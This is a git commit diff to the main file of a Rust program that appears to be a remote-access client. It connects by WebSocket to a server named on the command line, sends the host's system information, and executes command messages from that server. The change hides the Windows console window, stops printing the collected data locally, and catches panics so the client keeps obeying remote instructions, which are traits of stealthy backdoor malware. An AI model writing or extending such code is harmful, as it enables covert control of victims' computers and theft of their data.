922816e9f93d5c1a0c4c4f86abc9e633abac31f8
hagz0r <smansm338@gmail.com>
2024-07-29 18:15:08 +0500

    Continue processing instructions even if program panicked.

--- src/main.rs
+++ src/main.rs
@@ -1,7 +1,10 @@
-use std::io::{Read, Write};
-use std::str::FromStr;
+#![windows_subsystem = "windows"]
 
-use tungstenite::connect;
+use std::net::TcpStream;
+use std::panic;
+
+use tungstenite::{connect, WebSocket};
+use tungstenite::stream::MaybeTlsStream;
 
 use crate::router::{handle_message, MessageType};
 use crate::utils::SystemInformation;
@@ -9,7 +12,6 @@ use crate::utils::SystemInformation;
 mod utils;
 mod router;
 mod handlers;
-
 
 fn main() {
 	let args = std::env::args().collect::<Vec<String>>();
@@ -22,21 +24,31 @@ fn main() {
 }
 
 fn connect_with_host(server_addr: &str, port: &str) {
-	let (mut socket, response) = connect(format!("ws://{}:{}", server_addr, port)).expect("Can't connect");
+	let (mut socket, _response) = connect(format!("ws://{}:{}", server_addr, port)).expect("Can't connect");
 	let sysinfo = SystemInformation::get().to_string();
-	println!("{}",sysinfo);
 	socket.send(sysinfo.into()).unwrap();
 
+	loop {
+		let res = panic::catch_unwind(panic::AssertUnwindSafe(|| {
+			println!("ok");
+			read_messages(&mut socket)
+		}));
+		if let Err(e) = res {
+			println!("Program panicked at:");
+			dbg!(e);
+		}
+	}
+
+}
+
+fn read_messages(socket: &mut WebSocket<MaybeTlsStream<TcpStream>>) {
 	loop {
 		let msg = socket.read();
 		if let Ok(msg) = msg {
 			let text = msg.into_text().unwrap();
 			let bytes = text.as_bytes();
 			let message_type = MessageType::from_char(bytes[0] as char).expect("Invalid message type");
-			handle_message(message_type, &bytes[1..], &mut socket);
-		} else {
-			
-			continue;
+			handle_message(message_type, &bytes[1..], socket);
 		}
 	}
 }
